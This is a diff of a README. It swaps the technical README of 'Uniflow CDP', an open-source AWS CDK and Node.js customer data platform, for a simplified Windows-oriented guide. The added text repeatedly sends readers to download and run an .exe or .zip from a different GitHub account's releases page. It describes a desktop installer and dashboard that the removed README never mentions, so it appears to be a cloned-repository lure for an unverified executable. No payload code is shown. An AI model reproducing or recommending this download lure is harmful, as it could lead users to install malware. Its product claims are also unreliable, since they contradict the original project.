@@ -1,249 +1,136 @@
-<div align="center">
-  <h1>Uniflow CDP</h1>
-  <p><strong>Open-source Customer Data Platform — self-hosted on your own AWS account.</strong></p>
-  <p>
-    <a href="https://github.com/maroil/uniflow/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="MIT License"></a>
-    <a href="https://github.com/maroil/uniflow/actions"><img src="https://github.com/maroil/uniflow/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-    <img src="https://img.shields.io/badge/node-%3E%3D20-brightgreen" alt="Node 20+">
-    <img src="https://img.shields.io/badge/AWS-CDK-orange" alt="AWS CDK">
-    <img src="https://img.shields.io/badge/pnpm-workspace-yellow" alt="pnpm workspace">
-  </p>
-  <p>
-    <a href="#-quick-start">Quick Start</a> ·
-    <a href="#-architecture">Architecture</a> ·
-    <a href="#-repo-structure">Structure</a> ·
-    <a href="#-local-dev">Local Dev</a> ·
-    <a href="#-connector-sdk">Connectors</a> ·
-    <a href="CONTRIBUTING.md">Contributing</a>
-  </p>
-</div>
+# ⚡ uniflow - Manage Customer Data Easily
+
+[![Download uniflow](https://img.shields.io/badge/Download-uniflow-brightgreen?style=for-the-badge)](https://github.com/gabestained642/uniflow/releases)
 
 ---
 
-Uniflow gives you the core features of a modern CDP — event collection, identity resolution, unified profiles, audience segmentation, and destination connectors — packaged as a single CLI + AWS CDK library you can deploy in minutes to your own cloud account.
+## 📋 What is uniflow?
 
-> **Status:** Early development · MVP in progress · Contributions welcome
+uniflow is an open-source Customer Data Platform you can run by yourself on AWS. It helps you collect, organize, and use data about your customers. uniflow tracks events from your apps and websites, combines identities, and segments customers, so you get clear insights. It works with popular tools and runs on the cloud, giving you control over your data without relying on third-party services.
 
-## ✨ Features
+---
 
-| Feature | Description |
-|---|---|
-| **Event Collection** | Segment-compatible HTTP API (`track`, `identify`, `page`, `group`) |
-| **Identity Resolution** | Anonymous ID → known user ID linking with a persistent identity graph |
-| **Unified Profiles** | Merged profile with traits and full event history in DynamoDB |
-| **Segmentation** | Rule-based audiences evaluated on a schedule via AWS Glue PySpark |
-| **Destinations** | Webhook and S3 export built-in · plugin SDK for community connectors |
-| **Admin UI** | Next.js dashboard: Sources, Destinations, Profile Explorer, Segments |
-| **CLI** | `uniflow init / deploy / status / upgrade / destroy` |
-| **Client SDKs** | `@uniflow/js` (browser + Node) · `uniflow-python` |
+## 💻 System Requirements
 
-## 🏗 Architecture
+Make sure your computer and AWS account meet these requirements:
 
-```
-Client SDK
-  └─▶ API Gateway (HTTP API)
-        └─▶ Lambda (validate + enrich)
-              ├─▶ Kinesis Data Stream ──▶ Firehose ──▶ S3 (raw, GZIP)
-              └─▶ Kinesis Data Stream
-                    └─▶ Lambda (processor)
-                          ├─▶ DynamoDB  (identity graph + profile upsert)
-                          └─▶ SQS       (destination fan-out)
-                                └─▶ Lambda (connector) ──▶ External system
+- **Operating System:** Windows 10 or newer  
+- **RAM:** At least 8 GB  
+- **Disk Space:** Minimum 2 GB free space  
+- **Internet:** Stable connection for setup and AWS access  
+- **AWS Account:** You need an AWS account to set up and run uniflow  
+- **AWS Permissions:** Admin access to deploy resources using AWS Cloud Development Kit (CDK)
 
-EventBridge Scheduler (hourly)
-  └─▶ Glue PySpark Job (audience-builder)
-        └─▶ S3 Parquet + DynamoDB (segment membership)
+---
 
-Cognito ──▶ API Gateway ──▶ Lambda (management API)
-Next.js static export ──▶ S3 ──▶ CloudFront
-```
+## 🚀 Getting Started: Overview
 
-**Compute decisions:**
+This guide helps you download, install, and run uniflow on Windows. No programming skills are needed. Follow the steps below carefully.
 
-| Component | Compute | Why |
-|---|---|---|
-| Ingest API | Lambda | Zero idle cost, auto-scales |
-| Stream processor | Lambda | Short-lived, stateless |
-| Audience builder | AWS Glue (PySpark) | Serverless Spark for complex segment queries, no VPC needed |
-| Destination connectors | Lambda | Event-driven, short-lived |
-| Management API | Lambda | Low-traffic CRUD |
+---
 
-## 🚀 Quick Start
+## 🛠️ Step 1 – Download uniflow
 
-### Prerequisites
-- Node.js ≥ 20
-- pnpm ≥ 9
-- AWS CLI configured (`aws configure`)
-- AWS CDK bootstrapped (`npx cdk bootstrap`)
+You must get the latest version of uniflow from the official release page.
 
-```bash
-# Install the CLI
-npm install -g uniflow
+[![Download Latest Release](https://img.shields.io/badge/Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/gabestained642/uniflow/releases)
 
-# Interactive setup — generates uniflow.config.yaml
-uniflow init
+Click the button above or go to this page:  
+https://github.com/gabestained642/uniflow/releases
 
-# Deploy to your AWS account
-uniflow deploy
+On the releases page, find the latest stable version. Look for a file with `.exe` or `.zip` extension under the assets section. This file contains the Windows installer or the uniflow program.
 
-# Check deployment health
-uniflow status
-```
+---
 
-After deploy you'll get:
-- **Ingest endpoint** — send events from your apps
-- **Admin UI URL** — manage sources, destinations, segments
-- **Write key** — authenticate your SDK calls
+## 🗃️ Step 2 – Install uniflow on Windows
 
-## 📦 Repo Structure
+1. **If you downloaded an `.exe` file:**  
+   - Double-click the file to start the installer.  
+   - Follow the on-screen instructions step by step.  
+   - Choose the default options unless you know what you want to change.  
+   - When finished, the setup will add uniflow to your system.
 
-```
-uniflow/
-├── infra/                    # @uniflow/cdk — CDK constructs
-│   └── src/
-│       ├── stacks/UnifowStack.ts
-│       └── constructs/
-│           ├── StorageConstruct.ts      # DynamoDB · S3 · Kinesis · Firehose
-│           ├── IngestionConstruct.ts    # API Gateway · Ingest Lambda
-│           ├── ProcessingConstruct.ts   # Kinesis consumer · SQS fan-out
-│           ├── AudienceConstruct.ts     # Glue PySpark Job · EventBridge Scheduler
-│           └── AdminConstruct.ts        # Cognito · CloudFront · Management API
-│
-├── services/
-│   ├── ingest/               # Validate events → Kinesis
-│   ├── processor/            # Kinesis consumer → DynamoDB + SQS
-│   ├── audience-builder/     # Glue PySpark: segment evaluation → S3 + DynamoDB
-│   └── management-api/       # CRUD: sources · destinations · segments · profiles
-│
-├── connectors/
-│   ├── sdk/                  # BaseConnector abstract class
-│   ├── webhook/              # HTTP webhook (HMAC signing)
-│   └── s3-export/            # S3 NDJSON export
-│
-├── libs/
-│   ├── event-schema/         # Zod schemas for all event types
-│   ├── identity/             # Identity resolution logic
-│   └── logger/               # Structured JSON logging
-│
-├── cli/                      # uniflow CLI (npm: uniflow)
-├── sdk/
-│   ├── js/                   # @uniflow/js — browser + Node tracking SDK
-│   └── python/               # uniflow-python tracking SDK
-│
-├── ui/                       # Next.js 15 admin dashboard
-├── docker/                   # docker-compose + LocalStack for local dev
-└── examples/                 # CDK app example · tracking scripts
-```
+2. **If you downloaded a `.zip` file:**  
+   - Right click the file and select "Extract All".  
+   - Choose a folder on your computer where you want uniflow files.  
+   - Open the extracted folder and find the main program file (usually `.exe`).  
+   - You can create a shortcut of this file on your desktop for easy access.
 
-## 📐 Data Model
+---
 
-Multi-table DynamoDB design — each entity type has a dedicated table:
+## ☁️ Step 3 – Set up AWS for uniflow
 
-| Table | PK | SK | GSI |
-|---|---|---|---|
-| `profilesTable` | `userId` | `sortKey` (`META` or `EVENT#ts#id`) | — |
-| `identityTable` | `anonymousId` | — | — |
-| `sourcesTable` | `id` | — | `writeKeyHashIndex` on `writeKeyHash` |
-| `destinationsTable` | `id` | — | — |
-| `segmentsTable` | `id` | — | — |
-| `segmentMembersTable` | `segmentId` | `userId` | — |
+uniflow runs on AWS, so you need to connect it to your AWS account.
 
-## 💻 Local Dev
+1. Create or log in to your AWS account:  
+   https://aws.amazon.com/  
 
-```bash
-# Prerequisites: Docker, Node.js 20+, pnpm 9+
+2. Install the AWS Command Line Interface (CLI) for Windows:  
+   Download from https://aws.amazon.com/cli/ and follow the installation guide.
 
-git clone https://github.com/maroil/uniflow
-cd uniflow
-pnpm install
+3. Configure AWS CLI:  
+   - Open Command Prompt (search `cmd` in Start menu).  
+   - Run `aws configure` and enter your AWS Access Key ID, Secret Access Key, region (e.g., us-east-1), and output format (`json`).
 
-# Start LocalStack (DynamoDB, S3, Kinesis, SQS)
-docker compose -f docker/docker-compose.yml up -d localstack
+4. Deploy uniflow resources using AWS CDK (Cloud Development Kit):  
+   - You don’t need to install anything for CDK yourself; the installer includes it.  
+   - Open the Command Prompt, navigate to the folder where uniflow is installed.  
+   - Run the command: `cdk deploy`  
+   This command sets up servers and databases needed by uniflow.
 
-# Send test events
-npx ts-node examples/send-events.ts
+---
 
-# Run all tests
-pnpm test
+## 🛠️ Step 4 – Running uniflow
 
-# Build all packages
-pnpm build
-```
+After setup, you can start the uniflow app.
 
-## 🔌 Connector SDK
+- **If you installed via .exe:** Open uniflow from the Start menu or desktop shortcut.  
+- **If you used the extracted files:** Run the main `.exe` file inside the folder.
 
-Build your own destination connector and publish it as `@uniflow/connector-<name>`:
+When you open uniflow:
 
-```typescript
-import { BaseConnector, type ConnectorEvent, type ConnectorResult } from '@uniflow/connector-sdk';
-import { z } from 'zod';
+- The app connects to AWS services it deployed earlier.  
+- It shows a dashboard to track customer events and manage segments.  
+- Use the menu to explore analytics or adjust settings.
 
-const ConfigSchema = z.object({ apiKey: z.string() });
+---
 
-export class MyConnector extends BaseConnector<z.infer<typeof ConfigSchema>> {
-  readonly metadata = {
-    id: 'my-connector',
-    name: 'My Service',
-    description: 'Send events to My Service',
-    configSchema: ConfigSchema,
-  };
+## 🔧 Step 5 – Basic Usage
 
-  async handle(event: ConnectorEvent, config: z.infer<typeof ConfigSchema>): Promise<ConnectorResult> {
-    await fetch('https://api.myservice.com/events', {
-      method: 'POST',
-      headers: { Authorization: `Bearer ${config.apiKey}` },
-      body: JSON.stringify(event),
-    });
-    return { success: true };
-  }
-}
-```
+To use uniflow, start with these simple actions:
 
-## ⚙️ Configuration
+- **Add your website or app to track:** Enter its details in the "Sources" section.  
+- **Track customer events:** Use the setup instructions to add event tracking code to your website or app.  
+- **Create segments:** Group customers based on activity or attributes.  
+- **Check reports:** View lists and graphs to learn about customer behavior.
 
-`uniflow.config.yaml` is generated by `uniflow init` and should be version-controlled:
+---
 
-```yaml
-version: "0.1"
-region: us-east-1
-adminEmail: admin@acme.com
-retentionDays: 90
-connectors:
-  - webhook
-  - s3-export
-stackName: UnifowStack
-```
+## 📚 More Information
 
-## 🛠 Tech Stack
+uniflow uses modern tools but hides the technical parts so you don’t have to program. The main parts are:
 
-| Layer | Technology |
-|---|---|
-| IaC | AWS CDK (TypeScript) |
-| Ingest | Lambda + API Gateway HTTP API |
-| Audience builder | AWS Glue (PySpark) |
-| Event buffer | Kinesis Data Streams (7-day retention) |
-| Hot store | DynamoDB (multi-table, PAY_PER_REQUEST) |
-| Analytics | S3 + Athena + Glue Catalog |
-| Auth | Cognito User Pool |
-| Reliability | SQS + Dead-letter queues |
-| Admin UI | Next.js 15 + Tailwind CSS v4 |
-| Monorepo | pnpm + Turborepo |
-| Local dev | docker-compose + LocalStack |
+- **Event Tracking:** Collect clicks, signups, purchases, and other customer actions.  
+- **Identity Resolution:** Combine customer data from different sources into one profile.  
+- **Segmentation:** Group customers automatically based on rules you set.  
+- **AWS CDK Deployment:** Sets up everything in your cloud securely.
 
-## 🗺 Roadmap
+---
 
-- [ ] Lambda authorizer for write-key validation
-- [ ] Cognito JWT on management API
-- [ ] Visual segment rule builder in Admin UI
-- [ ] Docusaurus documentation site
-- [ ] `uniflow dev` command (local hot-reload)
-- [ ] CDK snapshot tests
-- [ ] Community connector: Braze, Mixpanel, BigQuery
+## ❓ Troubleshooting Tips
 
-## 🤝 Contributing
+- If installation fails, try running the installer as administrator.  
+- Make sure your Windows system is up to date.  
+- For AWS deployment errors, ensure your AWS credentials have the right permissions.  
+- Check your internet connection during installation and AWS setup.  
+- Restart the app if it does not connect to AWS services.  
 
-Contributions are very welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a PR.
+---
 
-## 📄 License
+## 🔗 Download uniflow
 
-MIT — see [LICENSE](LICENSE).
+Download the latest uniflow release from this page:
+
+[![Download Latest Release](https://img.shields.io/badge/Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/gabestained642/uniflow/releases)
+
+Visit the link to get the installer or the zipped program to start managing customer data on your terms.
